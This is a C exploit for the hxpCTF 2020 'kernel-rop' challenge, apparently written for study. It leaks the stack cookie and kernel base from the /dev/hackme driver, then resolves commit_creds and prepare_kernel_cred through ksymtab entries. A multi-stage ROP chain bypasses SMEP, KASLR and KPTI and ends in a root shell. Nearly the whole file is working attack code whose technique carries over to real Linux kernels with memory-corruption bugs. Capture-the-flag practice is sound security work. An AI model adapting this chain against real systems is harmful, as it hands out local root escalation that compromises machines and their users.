// hxpCTF 2020 kernel-rop Exploit
// SMEP
// Stack pivot
// KPTI
// KASLR

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>

int device_fd;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

int tmp_value;

void stage_1();
void stage_2();
void stage_3();
void stack_frame();

void signal_handler(int signum){
    system("/bin/sh");
}

void pwn(){
    puts("[*] Spawning shell on user land");
    uid_t uid = getuid();

    if (uid == 0){
        printf("[+] UID: %d, got root!");
    } else {
        printf("[-] UID: %d, could ot get root.");
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) pwn;

void open_device(){
    device_fd = open("/dev/hackme", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/hackme");
        exit(-1);
    } else {
        puts("Device /dev/hackme openned");
    }
}

unsigned long stack_cookie;
unsigned long image_base;

/* KASLR Gadgets & ksymtab Functions */

// 0xffffffff81004d11 : pop rax ; ret | (0x4d11)
unsigned long k_pop_rax__ret = 0x4d11UL;
// 0xffffffff81004aad : mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret | (0x4aad)
unsigned long k_mov_rax_ptr__pop_rbp__ret = 0x4aadUL;
// 0xffffffff81006370 : pop rdi ; ret | (0x6370)
unsigned long k_pop_rdi__ret = 0x6370;

//  0x200f10 TEXT swapgs_restore_regs_and_return_to_usermode
unsigned long k_swapgs_restore_regs_and_return_to_usermode = 0x200f10UL + 22UL;
// 0xf8d4fc RONLY __ksymtab_prepare_kernel_cred
unsigned long __ksymtab_prepare_kernel_cred = 0xf8d4fcUL;
// 0xf87d90 RONLY __ksymtab_commit_creds
unsigned long __ksymtab_commit_creds = 0xf87d90UL;

/* KASLR Gadgets & ksymtab Functions*/

void get_stack_cookie(){

    unsigned long stack[50]; // sizeof(unsigned long) = 8; 0x14 = 20
    
    // if stack cookie is right after tmp var in stack, stack cookie sould be in position position 16 of local stack array
    ssize_t r = read(device_fd, stack, sizeof(stack));

    stack_cookie = stack[16];

    // stack[38]: 0xffffffff91c0a157
    // _text:     0xffffffff91c00000
    // offset:    0x0a157
    image_base = stack[38] - 0x0a157UL;

    k_pop_rax__ret += image_base;
    k_mov_rax_ptr__pop_rbp__ret += image_base;

    /* struct kernel_symbol {
	    int value_offset;
	    int name_offset;
	    int namespace_offset;
    }; */

    k_swapgs_restore_regs_and_return_to_usermode += image_base;
    __ksymtab_prepare_kernel_cred += image_base; // image_base + 0xf8d4fcUL = ksymtab_prepare_kernel_cred.
    __ksymtab_commit_creds += image_base; // image_base + 0xf87d90UL = ksymtab_commit_creds
    k_pop_rdi__ret += image_base;


    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Stack cookie: %lx\n", stack_cookie);
    printf("[*] Image base: %lx\n", image_base);
    printf("[*] KPTI Trampoline: %lx\n", k_swapgs_restore_regs_and_return_to_usermode);

}

unsigned long real_address_commit_creds;
void save_commit_creds(){

    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_value, rax;"
        ".att_syntax;"
    );

    real_address_commit_creds += (int)tmp_value + __ksymtab_commit_creds;
    printf("[*] commit_creds Address: %lx\n", real_address_commit_creds);

    stage_2();

}

unsigned long real_address_prepare_kernel_cred;
void save_prepare_kernel_cred(){

    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_value, rax;"
        ".att_syntax;"
    );

    real_address_prepare_kernel_cred = (int)tmp_value + __ksymtab_prepare_kernel_cred;
    printf("[*] prepare_kernel_cred Address: %lx\n", real_address_prepare_kernel_cred);

    stage_3();
}

unsigned long cred_struct;
void save_cred_struct(){

    __asm__(
        ".intel_syntax noprefix;"
        "mov cred_struct, rax;"
        ".att_syntax;"
    );

    // cred_struct = (int)tmp_value;
    printf("[*] cred Struct Address: %lx\n", cred_struct);

    stack_frame();

}

void stage_3(void){ // 0xffffffff891fb260

    unsigned long payload[50];
    int off = 16;

    payload[off++] = stack_cookie;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = k_pop_rdi__ret;
    payload[off++] = 0x0;
    payload[off++] = real_address_prepare_kernel_cred;

    payload[off++] = k_swapgs_restore_regs_and_return_to_usermode;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = (unsigned long)save_cred_struct;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[+] Sending stage 3...");
    write(device_fd, payload, sizeof(payload));

}

void stage_2(void){
    unsigned long payload[50];
    int off = 16;

    payload[off++] = stack_cookie;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = k_pop_rax__ret; // pop rax with ksymtab_commit_creds address
    payload[off++] = __ksymtab_prepare_kernel_cred - 0x10;
    payload[off++] = k_mov_rax_ptr__pop_rbp__ret; // Move ksymtab_commit_creds address to rax
    payload[off++] = 0x0;
    payload[off++] = k_swapgs_restore_regs_and_return_to_usermode;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = (unsigned long)save_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[+] Sending stage 2...");
    write(device_fd, payload, sizeof(payload));
}

void stage_1(void){
    unsigned long payload[50];
    int off = 16;

    payload[off++] = stack_cookie;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = k_pop_rax__ret; // pop rax with ksymtab_commit_creds address
    payload[off++] = __ksymtab_commit_creds - 0x10;
    payload[off++] = k_mov_rax_ptr__pop_rbp__ret; // Move ksymtab_commit_creds address to rax
    payload[off++] = 0x0;
    payload[off++] = k_swapgs_restore_regs_and_return_to_usermode;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = (unsigned long)save_commit_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[+] Sending stage 1...");
    write(device_fd, payload, sizeof(payload));

}

unsigned long fake_stack;
void stack_frame(void){
    puts("[*] Trying to rewrite ret addr");

    unsigned long fake_stack[50];
    int off = 16;

    fake_stack[off++] = stack_cookie;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;

    fake_stack[off++] = k_pop_rdi__ret;
    fake_stack[off++] = cred_struct;

    fake_stack[off++] = real_address_commit_creds;

    // KPTI Trampoline Method. Return to swapgs_restore_regs_and_return_to_usermode function at mov rdi, rsp
    fake_stack[off++] = k_swapgs_restore_regs_and_return_to_usermode;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;
    
    fake_stack[off++] = (unsigned long)pwn;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;

    puts("[+] Writting final payload...");
    write(device_fd, fake_stack, sizeof(fake_stack));

}

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;" // push lower 16 bits of EFLAGS Register Onto the Stack
        "pop user_rflags;" // put first stack value (eflags)
        ".att_syntax;"
    );
}

int main(){

    // Setting up a signal handler will swap the kernel page table to userland mode.
    // signal(SIGSEGV, signal_handler);

    open_device();
    get_stack_cookie();
    save_registers_state();

    stage_1();
}